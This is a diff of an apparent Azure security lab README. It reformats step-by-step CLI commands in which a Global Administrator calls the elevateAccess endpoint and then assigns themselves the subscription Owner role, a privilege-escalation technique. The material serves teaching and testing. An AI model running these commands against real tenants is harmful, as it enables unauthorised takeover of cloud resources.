@@ -2,19 +2,29 @@
 
 ## Scenario 1 steps:
 
- - az login (Login as the Global Admin)
+#### 1) Login as the Global Admin
 
- - az login --allow-no-subscriptions (Get tenant-level access, then sign in again)
+    az login 
 
- - az rest --method post --url "/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01" (Exploit the Global Admin role to modify privileges to Azure resources)
+#### 2) Get tenant-level access, then sign in again
 
- - az logout
+    az login --allow-no-subscriptions 
 
- - az login (Reauthenticate back)
+#### 3) Exploit the Global Admin role to modify privileges to Azure resources
 
- - userPrincipalName=$(az ad signed-in-user show --query userPrincipalName -o tsv)
+    az rest --method post --url "/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01" 
 
- - az role assignment create --role "Owner" --assignee $userPrincipalName (Assign the subscription Owner role to the Global Administrator account)
+#### 4) Logout, then relogin
+
+    az logout
+
+    az login (Reauthenticate back)
+
+    userPrincipalName=$(az ad signed-in-user show --query userPrincipalName -o tsv)
+
+#### 5) Assign the subscription Owner role to the Global Administrator account
+
+    az role assignment create --role "Owner" --assignee $userPrincipalName 
 
 ### The commands will be successful, proving that you have used your elevated Global Administrator role to modify permissions for Azure resources!
 
